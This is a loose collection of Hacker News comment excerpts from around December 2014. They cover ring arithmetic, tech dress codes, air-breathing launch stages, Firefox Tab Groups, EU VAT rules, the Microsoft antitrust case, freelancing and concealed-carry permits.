People are writing low-level code basically in order to be able to explicitly make that choice, rather than having the compiler make it for them.<p>So, #2 is just a few extra guarantees about the intrinsics of regular machine-words, with minimal overhead for the fast path (even on the slower path of e.g. a 30-bit ring on 32-bit storage, there&#x27;s still an O(1) set of barrel-shifts and masks that can be used to implement that.)<p>A fully-general ringed arithmetic value, on the other hand, is more of an ADT. It could certainly be implemented in the same language and act like a number, but it wouldn&#x27;t be useful as backing storage for <i>other</i> types in the way #1, #2, and #3 are. (Note that #2 is a better backing store than #1 for many use-cases, e.g. encoding IP addresses and subnet masks.)",1418939973

Then my boss told me that the company actually didn&#x27;t have a dress code and I didn&#x27;t need to dress like that; I assured him that I was dressed that way because I liked dressing that way.  Then HR talked with me.  That&#x27;s when I finally took the hint.<p>The dress codes that most people are familiar with place a lower-bound on how you can dress.  <i>&quot;No shoes, no shirt, no service&quot;</i>, or <i>&quot;You&#x27;re a groomsman, you can&#x27;t show up to the wedding in a t-shirt you lunatic&quot;</i>.  The tech industry has a dress code, but it places an <i>upper</i>-bound on how you can dress.<p>My humble conspiracy theory?  Upper-bound dress codes encourage social stratification.  This is desired by people who are in power, but are surrounded by very clever and moderately well paid people (developers).

A normal fighter jet, intended to replace the F16.<p>B) Short takeoff and vertical landing (STOVL).

Isp of rocket engine is ~330 for methane-lox in the newer full-feed Merlin.  The impulse to fuel weight ratio is almost 10x inverse in favor of the air-breathing system.<p>The dry mass thrust-to-weight is decisively in favor of the rocket engine.

The lifetime of a gas turbine is measured in thousands of hours, so let&#x27;s say 200 missions and without so many major overhauls.  Even if Space X is pulling out some cool voodoo for Merlin reuse-ability, gas turbines are in a different league in terms of both reliability and lifetime.<p>While a 1st stage rocket body has to re-enter, land, and be transported back to the launch site, an air-breathing 0.5 stage can fly itself back from its short distance downrange, thereby incurring zero transport cost back to the launch site.<p>An extreme application of air-breathing might include ram-jet inlets that opened after mach ~1.8 and took over air-breathing duties up to Mach 4.0 as the 414&#x27;s idled.  Even in that case, the whole system is not that far downrange and can use altitude to make up quite a bit of the journey back and use some vertical landing system if it saves weight.  The fuel efficiency lets you do this with 414&#x27;s in spite of their lower T:W.<p>Does using air-breathing assist pay off by making a lighter 1st stage or heat-shielding the 1st stage to make a faster release point?

8769805,comment,8767143,8769198,0,0,saidajigumi,,,"I&#x27;ve used Firefox&#x27;s tab groups extensively in the past, but less so recently.  Overall, Tab Groups are a nice start but half-baked in their current implementation (as of FF 34).<p>The basic idea that one can have first-class sets of tabs that are related is just great.  You can name them, add or dismiss entire groups.  Love it.  Tabs are automatically persisted in their groups using the existing UI to add or dismiss tabs. IMO, this makes them far superior to manually managed bookmarks. When resuming a project, I just want to get back to my working state without having had to remember to save every important tab to some bookmark folder.  In this regard, I look to tab groups as a memory prostheses, helping me to keep track of what I was/will be doing on a given project between times I&#x27;m working on it.<p>That said, I find that the desktop metaphor aka &quot;messy desk full of papers&quot; simply doesn&#x27;t scale well for document storage and organization.  It never has.  It&#x27;s nigh impossible to organize, refactor, etc.  For example, moving tabs that have &quot;leaked&quot; from one project context (tab group) into another, or splitting out a group into a sub-project, is a major pain in the ass.  At least Windows Explorer and OS X&#x27;s Finder have some tools to enable easier drag-and-drop management.  Tab Groups introduces the metaphorical constraints, but none of the other affordances of the aforementioned file managers towards allowing organization.<p>What I really want are organizational tools that let me efficiently manage and swap between various project contexts.  Tab Groups have a big advantage over bookmarks here, since tab groups transparently maintain state -- you don&#x27;t need to remember to save every tab you open to some bookmark folder.  You just get your working state back later.<p>Also, Tab Groups made an incredibly unfortunate design decision: the set of groups is bound to a specific window.  There&#x27;s no way to open Window 1 on Tab Group A and Window 2 on Tab Group B.  If you have two windows in flight, each with tab groups, you basically have to keep those two windows open forever (or as long as a window has any active groups).  Again, the bookmarks model of a window-independent persistent store is far superior.<p>Last but not least, the current implementation is hampered severely by slow UI.  Firefox opening one window with a bunch of tabs is very slow now, even though tab opening is deferred.  I feel like this has been regressing, but haven&#x27;t rigorously measured.<p>The proper Tab Group UI is also <i>incredibly</i> slow.  It&#x27;s interesting (by which I mean depressing) to compare the speed and fluidity of Tab Groups to Safari 8&#x27;s iOS-like tab overview UI.  Safari&#x27;s UI is shockingly fast to appear, and it navigates quicker than a dolphin&#x27;s dream.  Tab Groups is just uniformly sluggish, even when it&#x27;s not difficult to interact with. It&#x27;s practically a cliché that web response speed matters enormously, but the Tab Groups UI is so slow that if it were a web page I&#x27;d often just give up on it and move on.  As it is, I keep reducing my use of it because it&#x27;s mostly too painful.  This comes back to a big failure of tab groups as a memory prostheses -- it&#x27;s got to be fast and fluid enough that it doesn&#x27;t become an interference with working flow.<p>That last element also implies larger feature and performance work I&#x27;d like to see.  For example, git-quick switching between tab groups.  I should be able to type a shortcut, a few letters of a search for a tab group (or a tab search, e.g. all tabs tagged with &quot;rust&quot;), hit enter and immediately see those tabs.  By &quot;immediately&quot;, I mean &quot;so fast that we need to add subtle animation to the UI to prevent change blindness&quot;.",1418938956

Scores are also submitted with a GPS location. Leaderboards are created locally and in real-time. So if I am playing a game, I see the top scores of people around me and can compete with them. If you had the second highest Flappy Bird score in your town, you&#x27;d play all goddamned day until you had the top score, wouldn&#x27;t you?<p><i>Unfair advantage</i><p>The local leaderboards are not only a new game mechanic, they&#x27;d also be completely fucking FREE. That&#x27;s right free.99. Maybe I charge for high-usage apps (100k+ scores/day), but I think I can build all this out and have it scale to ~10 million submitted scores a day for dirt cheap out of my pocket based on the tools I&#x27;ve already built out for Bashoto.<p><i>Why would I do this?</i><p>I want to use those the scores being submitted to create my own &quot;arcade&quot; app that consumers can use to see top games and scores being played in their area. The app turns more into a market place and I can charge for ads in the form of promoted games.<p>So I have two revenue streams<p><pre><code>  1. High usage and popular games paying for the API\n\n  2. Promotional ads in the arcade app.\n</code></pre>\nAnd the value it creates for gamedevs for free is:<p><pre><code>  1. Local leaderboards game mechanic to increase competition and replay value\n\n  2. Geospatial game usage analytics (where is your game popular) \n     Here&#x27;s a screenshot my current dashboard http://i.imgur.com/2BInRpU.png that would be adapted\n\n  3.

First, one with a proposal for a design of a stealth submarine, and then second, another example of an actual prototype of a stealth ship that underwent a year of testing (in which it performed admirably) before being rejected.<p>Here&#x27;s a telling excerpt from the submarine adventure:<p>> That submarine captain epitomized the hidebound Navy at its worst.  He frowned at my drawing and backhanded my concept.  &quot;We don&#x27;t build submarines that look like that.&quot;  He admitted that our test results were &quot;interesting&quot; but added, &quot;Your design would probably cost us two or three knots in speed.&quot;  I countered, &quot;But why care about losing three knots, when you are invisible to your enemy?&quot;<p>><p>> He ignored me.  &quot;This looks more like the _Monitor_ or the _Merrimac_ from the Civil War,&quot; he said.  &quot;We&#x27;d never build a modern submarine that looked like _that_.&quot; [1]<p>Then there was the full-scale testing of a stealth ship in which nightly tests were made with the Navy trying to detect the prototype with radar, and virtually always failing.  Eventually the Navy decided not to go ahead, on the grounds that they couldn&#x27;t keep it secret.  Rich also speculated on motivations:<p>> A future commander resented having only a four-man crew to boss around on a ship that was so secret that the Navy could not even admit it existed.  Our stealth ship might be able to blast out of the sky a sizeable Soviet attack force, but in terms of an officer&#x27;s future status and promotion prospects, it was about as glamorous as commanding a tugboat.

They&#x27;ve done a great job of making it a no-brainer for startups to start using more advanced analytics tools (not just Google Analytics) from day 1. I think we&#x27;re all better off for the ability it gives product developers to improve their product based on actual usage--since it means the overall quality of products is far better than if vanity metrics drove all product decisions.<p>I noticed they mentioned Heap Analytics (<a href=""https://heapanalytics.com/"" rel=""nofollow"">https://heapanalytics.com/</a>) as one of their competitors. We&#x27;ve been using Heap for over a year and it seems like the logical and magical next step in analytics. Mixpanel gave you smarter analytics on things you had the foresight to track, but Heap automatically tracks everything from the day you integrate it. That means you can get smart analytics even on things you didn&#x27;t have the clairvoyance to start tracking 6 months ago, or didn&#x27;t have the resources to insert tracking code in.<p>For startups, Heap&#x27;s automatic and retroactive tracking is huge. It means we can iterate on product features and marketing/outreach schemes way more quickly while still getting insight into what&#x27;s successful and what&#x27;s not. It&#x27;s not perfect--a couple times we&#x27;ve added special class names to our HTML elements so Heap can distinguish them, but that&#x27;s still easier than adding manual tracking code--but it&#x27;s a huge improvement over the old way.<p>I noticed Heap has a page comparing themselves with Mixpanel (<a href=""https://heapanalytics.com/compare/heap-vs-mixpanel"" rel=""nofollow"">https://heapanalytics.com/compare/heap-vs-mixpanel</a>) but I don&#x27;t see anything similar from Mixpanel&#x27;s POV.

Therefore, the entire argument turns on two things: (1) was Windows a monopoly (2) was IE an integral part of Windows (hence not a product competing in another market).<p>Since Windows, for all intents and purposes, was a monopoly, a huge part of the discussion was about whether IE was an integral part of the operating system and therefore MS actions were not to be considered as competition in a different market but simply innovation in the existing OS market.  Applications like Calculator had been part of operating systems for well over a decade by then and no-one was shipping any OS without one so there really was not a basis for comparison.  Browsers, however, were completely new.  Netscape, the first widely adopted consumer grade browser, seemed to be doing very well as a stand-alone application.  From today&#x27;s point of view, you could argue that no operating system would ever ship without a browser but that was not clear at the time.  A similar idea would be, in say 20 years, BitCoin lockers becoming an integral part of operating systems.  Not obvious today, at least not to anyone outside the niche community of enthusiasts.<p>Clearly, the courts got it wrong, in that browsers are part of the OS today (just as much as the Calculator).  However, MS&#x27; ability to put Netscape out of business really did slow innovation down overall for a really long time.  It took a long time for the market to correct itself and have the better products win.  In fact, it took another monopolist (Google) trying to protect its business in another market to come in and accelerate the pace of innovation.<p>TL,DR: Courts shouldn&#x27;t be in the position of deciding technology vision.  Not because they do not have noble intentions but because they do not have the expertise.",1418938416

We have some kind of shell company or subsidiary or something like that in the UK that all our EU sales go through, and it is registered for VAT in the UK, so we just need to add MOSS registration. Right now, we just collect the 20% UK rate, but our backend was designed to handle different rates for different countries--I just need to add rows for each country to the tax table.<p>We already ask for a billing address when a customer orders, and record the IP address, and we already do a location lookup by IP address on our cart, so we&#x27;ll just need to check that there is a match, and do something to deal with it if there is not. I expect there will mostly be matches.<p>I took a look at our existing customers. Only about 0.1% did not have an IP address on file that matched the country they gave for their billing address. Most of the ones that did not match had a telephone number on file, and the telephone number appeared to be in the country of their billing address.<p>That raises a question. Suppose a new customer orders online, giving France as their country. Their IP address is also in France, at least according to the ip => location database you have. That&#x27;s two pieces of non-contradictory evidence for France, and so you are good to go.<p>Are those two pieces of evidence only good for that particular sale? If the customer comes back a few months later and purchases again, again giving a French billing address but this time coming from a German IP address, can I use the French IP address from the first order and the French billing address from this order as sufficient evidence to again charge French VAT?<p>The VAT is supposed to be for the place the customer permanently resides, so for instance if that customer lives in France but is on vacation in Germany I&#x27;m supposed to charge French VAT. Billing address is much less likely to change during a vacation than IP address, so a person with two orders with French billing, and one French IP and one German IP, is probably far more likely to be a French resident temporarily in Germany than someone who has moved to Germany.<p>So, from a logical, common sense point of view, I&#x27;m inclined toward going with the customer&#x27;s stated billing address country if they have any IP addresses from that same country among their last few orders. Logical and common sense don&#x27;t alway match the law, though.<p>Another question is how to handle telephone sales. No IP address on a telephone sales. Figure it out from their phone number? Ask them to go to their computer and go to a page of ours, enter a number that the salesperson tells them, and hit &quot;submit&quot;, and get an IP from that?",1418938193

I was fresh out of college had no &quot;experience&quot; \nand apparently my college wasn&#x27;t among the ones recruiters look out for. I tried to get my resume in through the door but rarely manged to succeed and when I did the offers were so bad that I thought it best to not take up the job.<p>To get by I started freelancing. Odesk is a pretty good place to work if you are starting out. The people \nthere gladly trade inexperience for a tiny amount of salary(work!) and it can be a start. What I learnt though that it \nis more or less pointless to market yourself to the technology people (but if they do come to you on their own it is worth it to discuss the opportunity since you have a slightly upper hand in negotiations). Rather it is more profitable to market to people who <i>use</i> that technology.<p>So for instance suppose you work on your programming skills and learn how to build a CMS. This feat will be &quot;meh&quot; for technology people. They do this stuff day in and day out and see no value in it(maybe they will even criticize you for using jquery). But if you can learn to sell this CMS to say a local travelling agency who is still marketing their services through blogger, by showing them how much more they can accomplish if they used a better tool, then you are on to something. A single sale can transform into managing the server for them which can be quite a good source for recurring income.<p>Another thing that I learnt is that it is very valuable to have a domain expertise (besides programming). Taking the above example if you learn how the travelling agency conducts it&#x27;s business you will no doubt find ways to generate income from this knowledge. Maybe you will design a CRM for a them or maybe you will create a tool that makes it easier for them to find new leads or send invoices or whatever.... you will learn to look out for things that can be done better with a program  and that is where the real money is. That&#x27;s what these companies do after all don&#x27;t they?<p>Unless you have a debt, or a family to look out for, may be you are better off without a job (or maybe not). Regardless of this take time to learn how to market yourself and the stuff that you build.  Oh and how to deal with negativity I don&#x27;t know what will work for you but I pick up a PG Wodehouse book and laugh till my stomach hurts :)",1418938106

I grew up in a country where my grandfather bought me my first gun <i>before I was even born</i>.   And I&#x27;ve been shooting guns (rifles, pistols, etc.) since I was about 9 years old.<p>Here in the US, there is a large population of people who taking shooting very seriously.  There are competitive shooting events run through obstacle courses and using pop-up targets, similar to the things you may have seen on television for police training.  Yeah, people here do that kind of stuff <i>for fun</i>.  There are magazines, books, videos, training courses, etc. dedicated to tactical shooting, self-defense, etc.  Of course none of this is required (by and large, but see below) and not everybody goes to this extreme.  But this is what I mean by &quot;gun people&quot;.  And in my experience here, the kind of people who make the choice to carry in public, tend to come from that population.  So yeah, I by and large trust those people to do the right thing in a scary situation.<p><i>I would be on your side completely if, to get that permit, you had to take a yearly training course to ensure you are going to act rationally and safely in an event like a movie theatre shooting.</i><p>FWIW, every US state sets its own standards.  Not all states even require a permit for pistols (concealed or otherwise). But in my state (NC), if I want to get a concealed carry permit, I do actually have to attend a training course which includes covering the legalities of carrying a firearm and using deadly force, a firearms safety component, and a visit to the gun range where I would have to certify as proficient with my weapon.

He builds castles in the air, from air, creating by exertion of the imagination. Few media of creation are so flexible, so easy to polish and rework, so readily capable of realizing grand conceptual structures. Yet the program construct, unlike the poet’s words, is real in the sense that it moves and works, producing visible outputs separate from the construct itself. It prints results, draws pictures, produces sounds, moves arms.&quot;",1418937640
